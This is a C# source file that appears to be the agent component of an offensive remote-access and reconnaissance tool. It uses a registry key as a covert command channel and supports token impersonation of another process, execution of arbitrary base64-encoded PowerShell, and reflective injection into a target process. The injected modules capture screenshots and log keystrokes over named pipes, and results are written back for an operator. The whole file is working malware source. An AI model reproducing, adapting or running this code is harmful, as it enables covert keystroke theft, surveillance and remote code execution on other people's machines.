using System;
using System.Text;
using Microsoft.Win32;
using System.Security.Principal;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using ReflectiveInjector;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;

namespace RemoteReconCore
{
    [ComVisible(true)]
    public class Agent
    {
        public Agent()
        {

        }

        public void Run(string basepath, string runkey, string commandkey, string argumentkey, string resultkey, string keylogkey, string screenshotkey)
        {
            //open base key
            RegistryKey hklm = Registry.LocalMachine;

            //Get the recon module from the embedded resource
            //mod = GetReconModule();
#if DEBUG
            Console.WriteLine("Opening Remote Recon base key");
#endif
            if ((rrbase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree)) == null)
                System.Environment.Exit(0); /*Exit because we couldn't open the basekey*/

            modkey = runkey;
            kkey = keylogkey;
            while (rrbase.GetValue(runkey) != null)
            {
                //main loop
                Thread.Sleep((sleep * 1000));
                int cmd;
                if ((cmd = (int)rrbase.GetValue(commandkey)) == 0)
                    continue; /*Continue if no cmd*/

                command = new KeyValuePair<int, object>(cmd, rrbase.GetValue(argumentkey));
                Exec();

                //Post results to the appropriate key
                switch (command.Key)
                {
                    case (int)Cmd.Impersonate:
#if DEBUG
                        Console.WriteLine("Writing Impersonate command Result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, Convert.ToBase64String(Encoding.ASCII.GetBytes((string)result.Value)), RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        //rrbase.SetValue(runkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, object>(0, "");
                        break;
                    case (int)Cmd.Screenshot:
#if DEBUG
                        Console.WriteLine("Writing Screenshot command Result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        if (result.Key == 0) rrbase.SetValue(screenshotkey, result.Value, RegistryValueKind.String);
                        else rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        rrbase.SetValue(runkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, object>(0, "");
                        break;

                    case (int)Cmd.PowerShell:
#if DEBUG
                        Console.WriteLine("Writing Powershell command result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, object>(0, "");
                        break;
                    case (int)Cmd.Revert:
#if DEBUG
                        Console.WriteLine("Writing Revert command result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, object>(0, "");
                        break;
                    case (int)Cmd.Keylog:
#if DEBUG
                        Console.WriteLine("Writing keylog command result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        result = new KeyValuePair<int, object>(0, "");
                        break;
                    default:
                        break;
                }
            }
        }

        private void Exec()
        {
            //Check the command keyvalue pair for a new command.
            if ((int)Cmd.Impersonate == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Impersonate command");
#endif
                impersonate(Convert.ToInt32(command.Value));
            }
            else if ((int)Cmd.Screenshot == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Screenshot command");
#endif
                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                GetScreenShot(Convert.ToInt32(command.Value));
            }
            else if ((int)Cmd.Keylog == command.Key)
            {
                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                LogKeystrokes(Convert.ToInt32(command.Value));
            }
            else if ((int)Cmd.PowerShell == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received PowerShell command");
#endif
                string decoded = Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value));
                RunPowershell(decoded);
            }
            else if ((int)Cmd.Revert == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Revert command");
#endif
                try
                {
                    context.Undo();
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Successfully reverted token."));
                    result = new KeyValuePair<int, object>(0, msg);
                }
                catch (Exception e)
                {
                    string err = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                    result = new KeyValuePair<int, object>(4, err);
                }
            }
        }

        private static int sleep = 5;
        private static WindowsImpersonationContext context = null;
        //private string exceptionInfo;
        private byte[] mod;
        public static string modkey;
        public static string kkey;
        public static KeyValuePair<int, object> command;
        public static KeyValuePair<int, object> result;
        private bool kl = false;
        private Thread keylogThread;
        RegistryKey rrbase;

        public enum Result : int
        {
            Success = 0,
            InjectFailed = 1,
            ScreenShotFailed = 2,
            KeylogFailed = 3,
            ImpersonateFailed = 4,
            PSFailed = 5,
            AssemblyFailed = 6,
            RevertFailed = 7
        }

        public enum Cmd : int
        {
            Impersonate = 1,
            Keylog = 2,
            Screenshot = 3,
            PowerShell = 4,
            Revert = 5,
            Assembly = 6
        }

        private void impersonate(int pid)
        {
            IntPtr hProcHandle = IntPtr.Zero;
            IntPtr hProcToken = IntPtr.Zero;

            if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid)) == IntPtr.Zero)
                if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid)) == IntPtr.Zero)
                    WinApi.CloseHandle(hProcHandle);

            if (!WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken))
                WinApi.CloseHandle(hProcHandle);

            WindowsIdentity newId = new WindowsIdentity(hProcToken);

            try
            { 
                context = newId.Impersonate();
                result = new KeyValuePair<int, object>(0, "Impersonated: " + newId.Name);
            }
            catch (Exception e)
            {
                result = new KeyValuePair<int, object>(4, e.ToString());
            }
        }

        private void RunPowershell(string cmd)
        {
            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                Pipeline pipeline = runspace.CreatePipeline();

                //Adding command
                pipeline.Commands.AddScript(cmd);

                //Get output 
                pipeline.Commands.Add("Out-String");
                Collection<PSObject> results = pipeline.Invoke();
                runspace.Close();

                //Convert to string
                StringBuilder resultString = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    resultString.Append(obj);
                }

                string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(resultString.ToString().Trim()));
                result = new KeyValuePair<int, object>(0, enc);
            }
            catch (Exception e)
            {
                result = new KeyValuePair<int, object>(5, e.ToString());
            }
        }

        private  void LogKeystrokes(int pid)
        {
            //Function that will inject the remote recon module into a process and wait for keystrokes.

            byte[] keylogMod = PatchRemoteReconNative("keylog");
            Injector keylogger = new Injector(pid, keylogMod);

#if DEBUG
            Console.WriteLine("Created keylog object");
#endif
            if (!keylogger.Inject())
                result = new KeyValuePair<int, object>(3, "Recon module injection failed");
            else
            {
#if DEBUG
                Console.WriteLine("Starting background thread to record keystrokes");
#endif
                keylogThread = new Thread(() =>
                {
                    KeylogSync();
                });

                keylogThread.IsBackground = true;
                keylogThread.Start();
#if DEBUG
                Console.WriteLine("Started keylogger successfully");
#endif
                result = new KeyValuePair<int, object>(0, "Keylogger started");
            }
        }

        private void KeylogSync()
        {
            NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.InOut);
            kl = true;
            try
            {

                client.Connect();
#if DEBUG
                Console.WriteLine("Connected to named pipe server");
#endif
                StreamReader reader = new StreamReader(client);
                while (kl)
                {
#if DEBUG 
                    Console.WriteLine("At the top of the loop");
#endif
                    //main loop to take keylog ouput and place into the registry
                    string currVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)rrbase.GetValue(kkey)));
                    string newVal = reader.ReadToEnd();
                    currVal = currVal + newVal;
                    string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(currVal));
                    rrbase.SetValue(kkey, enc, RegistryValueKind.String);
                    Thread.Sleep(1000 * sleep);
                }

                client.Close();
                client.Dispose();
            }
            catch (Exception e)
            {
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                rrbase.SetValue(kkey, msg, RegistryValueKind.String);
            }
            
            
        }

        private void GetScreenShot(int pid)
        {
            string image = "";
            //Inject the recon module into the target process.
            byte[] screenshotMod = PatchRemoteReconNative("screenshot");
            Injector screenshot = new Injector(pid, screenshotMod);
            
#if DEBUG
            Console.WriteLine("Created screenshot object");
#endif
            if (!screenshot.Inject())
                result = new KeyValuePair<int, object>(2, "Recon module injection failed.");
            else
            {
                //TODO: Write named pipe client to grab output from the remote module
#if DEBUG
                Console.WriteLine("Attempting to connect to named pipe");
#endif

                try
                {
                    NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_ss", PipeDirection.InOut);
                    
                    client.Connect((1000 * sleep));
                    StreamReader reader = new StreamReader(client);
                    image = reader.ReadLine();
                    
                    client.Close();
                    client.Dispose();
#if DEBUG
                    Console.WriteLine("Writing result");
#endif
                    result = new KeyValuePair<int, object>(0, image);
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Connect to namedpipe failed");
#endif
                    result = new KeyValuePair<int, object>(2, e.ToString());
                }
            }
        }
        

        private byte[] PatchRemoteReconNative(string cmd)
        {
            byte[] cmdBytes = Encoding.ASCII.GetBytes(cmd);
            byte[] modCopy = mod;
            int index = 0;
            string moduleString = Encoding.ASCII.GetString(mod);
            index = moduleString.IndexOf("Replace-Me  ");

            if(index == 0)
                return new byte[1] { 0 };

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                modCopy[index + i] = cmdBytes[i];
            }

            modCopy[index + cmdBytes.Length] = 0x00;
            modCopy[index + cmdBytes.Length + 1] = 0x00;

            return modCopy;
        }
    }
}
